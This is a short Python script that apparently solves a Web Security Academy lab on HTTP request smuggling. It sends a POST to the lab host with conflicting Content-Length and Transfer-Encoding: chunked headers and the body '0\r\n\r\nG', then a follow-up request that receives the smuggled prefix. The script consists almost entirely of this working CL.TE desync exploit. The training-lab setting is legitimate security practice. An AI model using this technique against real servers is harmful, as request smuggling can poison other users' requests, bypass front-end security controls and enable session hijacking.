import http.client


def send_request(url, method="GET", headers={}, body=None):
    try:
        connection = http.client.HTTPSConnection(url)
        connection.request(method, "/", body=body, headers=headers)
        response = connection.getresponse()

        if response.status == 200:
            print("OK !")
        else:
            content = response.read().decode("utf-8")
            print(f"NO: {response.status} {response.reason} {content}")

    except Exception as e:
        print(f"Error request: {e}")


if __name__ == "__main__":
    lab = "0abc000b04e6843280f9945600020096" + ".web-security-academy.net"

    request_method = "POST"

    request_headers = {
        "Host": lab,
        "Content-Length": "6",
        "Transfer-Encoding": "chunked",
    }

    request_body = "0\r\n\r\nG"

    send_request(
        url=lab, method=request_method, headers=request_headers, body=request_body
    )

    send_request(url=lab, method=request_method)
